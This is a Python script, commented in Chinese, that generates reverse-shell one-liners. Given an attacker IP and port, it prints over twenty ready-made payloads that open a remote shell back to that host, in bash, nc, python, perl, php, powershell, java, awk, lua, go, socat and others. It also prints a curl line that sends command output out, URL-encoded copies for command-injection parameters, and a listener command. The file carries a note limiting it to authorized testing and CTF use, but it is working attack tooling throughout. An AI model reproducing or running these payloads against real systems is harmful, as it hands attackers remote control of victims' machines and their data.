# -*- coding: utf-8 -*-
# 脚本名称: 反弹 Shell 一句话生成器（多语言/多平台）
# 方向: Web / Pwn（ getshell 后回弹）
# 简介: 给定攻击机 IP 与端口，一键生成 bash/nc/python/perl/php/ruby/powershell/
#       java/node/awk/lua 等 20+ 种反弹 shell payload，并给出监听命令；
#       自动生成 URL 编码版本（用于命令注入 GET 参数）。
# 用法:
#   python reverse_shell_gen.py 10.10.14.3 4444
#   python reverse_shell_gen.py 10.10.14.3 4444 --urlencode
#   python reverse_shell_gen.py --selftest
# 依赖: 仅标准库
# 注意: 仅限授权测试/CTF 靶场环境。
import argparse
import sys
import urllib.parse

TEMPLATES = {
    "bash -i": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash 195": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    "nc -e (传统)": "nc -e /bin/sh {ip} {port}",
    "nc 无 -e": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "ncat TLS": "ncat --ssl {ip} {port} -e /bin/sh",
    "python2/3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "python windows": (
        "python -c \"import socket,subprocess,os;"
        "s=socket.socket();s.connect(('{ip}',{port}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "subprocess.call(['cmd.exe'])\""),
    "perl": (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
    "php": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "ruby": (
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),
    "powershell": (
        "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$x = ($error[0] | Out-String);$error.clear();$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
    "powershell 一行": (
        "powershell -nop -c \"$client = New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$client.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);"
        "$s.Write($rb,0,$rb.Length);$s.Flush()}}\""),
    "java": (
        "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};"
        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()"),
    "nodejs": (
        "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')"),
    "awk": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c;"
           " if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}' /dev/null",
    "lua": (
        "lua -e \"require('socket');require('os');"
        "local t=socket.tcp();t:connect('{ip}','{port}');"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""),
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";func main(){{"
        "c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go"),
    "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    "curl 外带": "curl http://{ip}:{port}/`whoami`",
}


def generate(ip, port):
    return {name: t.format(ip=ip, port=port) for name, t in TEMPLATES.items()}


def selftest():
    g = generate("10.0.0.1", 4444)
    assert "/dev/tcp/10.0.0.1/4444" in g["bash -i"]
    assert "10.0.0.1',4444" in g["powershell"]
    enc = urllib.parse.quote(g["bash -i"], safe="")
    assert "%2Fdev%2Ftcp" in enc
    print("[+] 生成 %d 种 payload，URL 编码正常" % len(g))
    print("[+] selftest OK")


def main():
    ap = argparse.ArgumentParser(description="反弹 shell 生成器（仅限授权测试）")
    ap.add_argument("ip", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--urlencode", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        selftest(); return
    if not a.ip or not a.port:
        print("[!] 用法: python reverse_shell_gen.py <攻击机IP> <端口>"); return
    print(f"# 攻击机先监听: nc -lvnp {a.port}\n")
    for name, payload in generate(a.ip, a.port).items():
        print(f"===== {name}")
        print(payload)
        if a.urlencode:
            print("[URL编码]", urllib.parse.quote(payload, safe=""))
        print()


if __name__ == "__main__":
    main()
